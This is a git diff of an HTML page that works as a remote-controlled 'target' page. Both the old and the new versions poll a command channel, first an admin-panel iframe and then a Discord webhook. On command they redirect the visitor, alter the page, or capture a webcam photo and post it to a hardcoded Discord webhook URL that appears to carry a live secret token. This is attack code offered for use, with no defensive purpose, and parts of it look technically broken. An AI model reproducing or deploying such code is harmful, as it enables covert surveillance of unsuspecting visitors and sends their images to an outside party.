@@ -1,94 +1,88 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Target Page</title>
+    <title>Controlled Page</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
-            background-color: white;
-            transition: background 0.5s;
+            transition: all 0.3s;
         }
-        #chat {
-            margin-top: 20px;
-            padding: 10px;
-            background: #f1f1f1;
-            display: none;
-            border-radius: 10px;
+        .glitch {
+            animation: glitch 0.3s infinite;
+        }
+        @keyframes glitch {
+            0% { transform: translate(2px, 2px); }
+            50% { transform: translate(-2px, -2px); }
+            100% { transform: translate(2px, 2px); }
         }
     </style>
 </head>
 <body>
-    <h1>Target Page</h1>
-    <p id="message">Menunggu perintah...</p>
-    <div id="chat" style="display: none;"></div>
-    <video id="video" autoplay style="display: none;"></video>
-    <canvas id="canvas" style="display: none;"></canvas>
+    <h1 id="message">Waiting for commands...</h1>
+    <video id="camera" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas><script>
+    const webhookURL = "https://discord.com/api/webhooks/1353718170984386631/XHoEF7XoKIiE-j_jUTUfa2ej82RT1jN_dBxsJRrwfVxtOtJmf_vnlEoi9KpBbGbM8h7_";
 
-    <script>
-        async function checkCommand() {
-            try {
-                let frame = document.createElement("iframe");
-                frame.style.display = "none";
-                frame.src = "https://hazelnuttty.github.io/admin-panel/"; // Sesuaikan dengan URL admin
-
-                document.body.appendChild(frame);
-
-                frame.onload = function () {
-                    let command = frame.contentWindow.localStorage.getItem("command");
-                    document.getElementById("message").innerText = "Pesan: " + command;
-
-                    if (command.startsWith("redirect:")) {
-                        window.location.href = command.replace("redirect:", "").trim();
-                    } else if (command.startsWith("bgcolor:")) {
-                        document.body.style.backgroundColor = command.replace("bgcolor:", "").trim();
-                    } else if (command.startsWith("pesan:")) {
-                        let pesan = command.replace("pesan:", "").trim();
-                        let chatBox = document.getElementById("chat");
-                        chatBox.style.display = "block";
-                        chatBox.innerText = pesan;
-                    } else if (command.trim() === "capture") {
-                        captureAndSend();
-                    }
-
-                    document.body.removeChild(frame);
-                };
-            } catch (error) {
-                console.error("Gagal mengambil perintah", error);
+    async function checkMessages() {
+        try {
+            const response = await fetch(webhookURL);
+            const data = await response.json();
+            if (data.length > 0) {
+                const lastMessage = data[0].content.toLowerCase();
+                handleCommand(lastMessage);
             }
+        } catch (error) {
+            console.error("Error fetching webhook messages", error);
         }
-        setInterval(checkCommand, 3000);
+    }
 
-        async function captureAndSend() {
-            let video = document.getElementById("video");
-            let canvas = document.getElementById("canvas");
-            let ctx = canvas.getContext("2d");
-
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    video.srcObject = stream;
-                    setTimeout(() => {
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        ctx.drawImage(video, 0, 0);
-                        stream.getTracks().forEach(track => track.stop());
-                        sendToDiscord(canvas.toDataURL("image/png"));
-                    }, 2000);
-                })
-                .catch(err => console.error("Gagal mengakses kamera", err));
+    function handleCommand(command) {
+        if (command === "glitch on") {
+            document.body.classList.add("glitch");
+        } else if (command === "glitch off") {
+            document.body.classList.remove("glitch");
+        } else if (command.startsWith("redirect ")) {
+            window.location.href = command.replace("redirect ", "");
+        } else if (command.startsWith("message ")) {
+            document.getElementById("message").textContent = command.replace("message ", "");
+        } else if (command === "capture") {
+            startCamera();
+            setTimeout(takePhoto, 2000);
         }
+    }
 
-        async function sendToDiscord(imageData) {
-            let webhookURL = "https://discord.com/api/webhooks/1353718170984386631/XHoEF7XoKIiE-j_jUTUfa2ej82RT1jN_dBxsJRrwfVxtOtJmf_vnlEoi9KpBbGbM8h7_";
-            let payload = { content: "📸 Capture from target", files: [{ attachment: imageData, name: "capture.png" }] };
+    function startCamera() {
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                document.getElementById("camera").srcObject = stream;
+            })
+            .catch(err => console.error("Camera access denied", err));
+    }
 
-            fetch(webhookURL, {
-                method: "POST",
-                body: JSON.stringify(payload),
-            }).catch(err => console.error("Gagal mengirim gambar", err));
-        }
-    </script>
+    function takePhoto() {
+        const video = document.getElementById("camera");
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0);
+        video.srcObject.getTracks().forEach(track => track.stop());
+        const imgData = canvas.toDataURL("image/png");
+        sendToWebhook(imgData);
+    }
+
+    function sendToWebhook(imageData) {
+        fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: "Captured image", embeds: [{ image: { url: imageData } }] })
+        });
+    }
+
+    setInterval(checkMessages, 5000);
+</script>
+
 </body>
 </html>
